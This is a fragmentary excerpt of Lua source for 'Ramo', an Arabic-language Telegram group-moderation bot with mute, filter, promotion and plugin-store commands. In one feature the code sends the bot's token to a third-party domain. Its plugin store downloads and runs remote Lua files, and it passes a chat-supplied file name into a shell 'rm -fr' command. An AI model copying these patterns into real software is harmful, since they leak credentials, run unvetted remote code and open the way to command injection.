send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevRamo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevRamo(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevRamo(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevRamo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if DevRamo(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/T_O_Y_S/Files_Ramo/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n✯︙اهلا بك في متجر ملفات رامو\n✯︙ملفات السورس ↓\nٴ≪━━━━ Ramo ━━━━≫ٴ\n\n"
local TextE = "\nٴ≪━━━━ Ramo ━━━━≫ٴ\n✯︙علامة تعني { ✔️ } ملف مفعل\n✯︙علامة تعني { ✖ } ملف معطل\n✯︙قناة سورس رامو ↓\n".." ✯︙[اضغط هنا لدخول](t.me/T_O_Y_S) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/T_O_Y_S/Files_Ramo/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('RaMo.lua')  
else
send(msg.chat_id_, msg.id_," ✯︙عذرا الملف لايدعم سورس رامو \n") 
end
return false
end
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevRamo(msg) then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevRamo(msg) then
...
if text == "مسح الملفات" and DevRamo(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ✯︙تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevRamo(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevRamo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
HttpsMsg = https.request('https://api-Ramo.ml/abahi/abahi.php?Get=Ramo&TokenBot='..token..'&Url='..UrlId)
...
if database:get(bot_id..'DRAGOON:change:Ramo'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:Ramo'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:Ramo'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:Ramo'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:Ramo'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "abos-Ramo")
...
database:sadd(bot_id.."Dev:Ramo:2", result.sender_user_id_)
...
database:sadd(bot_id.."Dev:Ramo:2", result.id_)
...
database:sadd(bot_id.."Dev:Ramo:2", userid)
...
function Function_Ramo(extra, result, success)
database:srem(bot_id.."Dev:Ramo:2", result.sender_user_id_)
...
function Function_Ramo(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:Ramo:2", result.id_)
...
database:srem(bot_id.."Dev:Ramo:2", userid)
...
database:del(bot_id.."Dev:Ramo:2")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✯︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'T_O_Y_S')..')'
status  = '\n✯︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✯︙العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'T_O_Y_S')..')'
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or T_O_Y_S}},
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/T_O_Y_S"}},
}
local msg_id = msg.id_/2097152/0.5
...
Text = [[
  ✯︙[DeVeLoPErE OF SoURcE](https://t.me/Ramo41)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙DeVeLoPErE OF SoURcE',url="t.me/Ramo41"}},
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/T_O_Y_S"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/T_O_Y_S&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
[✯︙ChAnNeL OF SoURcE](https://t.me/T_O_Y_S)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/T_O_Y_S"}},
...
{{text = 'Ramo TeaM .', url="t.me/T_O_Y_S"}},
...
database:set(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ✯︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Ramo1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Ramo1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ✯︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Ramo1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Ramo1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Ramo1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ✯︙ارسل الكلمه الان")  
database:set(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Ramo1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Ramo1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Ramo1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Ramo1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Ramo1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Ramo1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n✯︙قائمة المنع \nٴ≪━━━━ Ramo ━━━━≫ٴ\n"
for k,v in pairs(list) do  
local Ramo_Msg = database:get(bot_id.."Ramo1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..Ramo_Msg.."}\n"    
end  
if #list == 0 then  
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح كليشه المطور' and DevRamo(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'✯︙تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevRamo(msg) then
...
if text == 'تفعيل الوضع المدفوع' and DevRamo(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,Ramo) 
if not database:sismember(bot_id..'Ramo:ProGroups',msg.chat_id_) then
database:sadd(bot_id..'Ramo:ProGroups',msg.chat_id_) 
database:set(bot_id.."Ramo:ProGroups:Time"..msg.chat_id_,os.date("%Y/%m/%d"))
Ramo = '\n✯︙المجموعه ['..Ramo.title_..'] \n✯︙تم تفعيل الوضع المدفوع بتاريخ '..os.date("%Y/%m/%d")..' \n✯︙سينتهي الوضع المدفوع بعد 30 يوم من الان'
else
...
if text == 'تعطيل الوضع المدفوع' and DevRamo(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,Ramo) 
if database:sismember(bot_id..'Ramo:ProGroups',msg.chat_id_) then
database:srem(bot_id..'Ramo:ProGroups',msg.chat_id_) 
database:del(bot_id.."Ramo:ProGroups:Time"..msg.chat_id_)
...
if text == 'المجموعات المدفوعه' or text == 'الكروبات المدفوعه' and DevRamo(msg) then
local List = database:smembers(bot_id.."Ramo:ProGroups")
local Ramo = '✯︙المجموعات المدفوعه \n✯︙تاريخ اليوم'..os.date("%Y/%m/%d")..' \nٴ≪━━━━ Ramo ━━━━≫ٴ\n'
for k,v in pairs(List) do
local Ramogetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'رامو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'رامو')
local Ramo_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..Ramo_Msg[math.random(#Ramo_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevRamo(msg) then 
...
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:Ramo:2',msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 Ramo.',url="t.me/T_O_Y_S"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."T_O_Y_S:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'➫✿ تم تفعيل الانستا')
database:set(bot_id.."T_O_Y_S:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."T_O_Y_S:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."T_O_Y_S:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"✯︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."T_O_Y_S:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."T_O_Y_S:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ""..(database:get(bot_id..'Name:Bot') or 'رامو').." غادر" or text == 'غادر' then  
...
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي") and msg.reply_to_message_id_ == 0 and DevRamo(msg) then 
send(msg.chat_id_, msg.id_,'✯︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
database:setex(bot_id.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if database:get(bot_id.."Abs:EditDev"..msg.sender_user_id_) then
...
if text == 'تفعيل المغادره' and DevRamo(msg) then   
...
if text == 'تعطيل المغادره' and DevRamo(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'T_O_Y_S')..')'
local iduser = result.sender_user_id_
...
local Ramo = '✯︙عدد الادمنيه : '..data.administrator_count_..
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,Ramo,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (Ramo.total_count_ or 0)
...
local rdphoto = Ramoa[math.random(#Ramoa)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Ramo.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
-- vardump(data) 
Ramodx(msg.chat_id_, msg.id_, '✯︙ايدي المجموعة » ( '..msg.chat_id_..' )\n✯︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n✯︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n✯︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
Ramo = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,Ramo)  
...
Ramo = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,Ramo)  
...
if text == 'استعاده الاوامر' and DevRamo(msg) then
...
{
{text = 'Ramo 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/T_O_Y_S"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/Ramo"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
...
database:set(bot_id.." Ramo:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الزخرفه')
database:set(bot_id.." Ramo:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زغرفه (.*)$") and database:get(bot_id.." Ramo:zhrf_Bots"..msg.chat_id_) == "open" then
...
send(msg.chat_id_, msg.id_, t..'ٴ≪━━━━ Ramo ━━━━≫ٴٴ\n✯︙➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 Ramo. ](t.me/T_O_Y_S)➤ ')
end
if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل الابراج')
database:set(bot_id.." Ramo:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الابراج')
database:set(bot_id.." Ramo:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." Ramo:brj_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." Ramo:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل حساب العمر')
database:set(bot_id.." Ramo:age_Bots"..msg.chat_id_,"close")
...
database:set(bot_id.." Ramo:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." Ramo:age_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.."Ramo:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الافلام')
database:set(bot_id.."Ramo:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."Ramo:movie_bot"..msg.chat_id_) == "open" then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ ----- callback add dev mr Ramo
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'رامو')
...
Ramo = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Ramo)
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
SourceRamo(data.message_,data)
plugin_Ramo(data.message_)
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
local RamoAbot = database:get(bot_id.."Ramo1:Add:Filter:Rp2"..text..result.chat_id_)   
if RamoAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n✯︙["..RamoAbot.."] \n") 
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text then
local Ramo1_Msg = database:get(bot_id.."Ramo1:Add:Filter:Rp2"..text..result.chat_id_)   
if Ramo1_Msg then    
send(msg.chat_id_, msg.id_," ✯︙"..Ramo1_Msg)
...
end -- end new msg dev.mr Ramo 
end -- end callback dev.mr Ramo
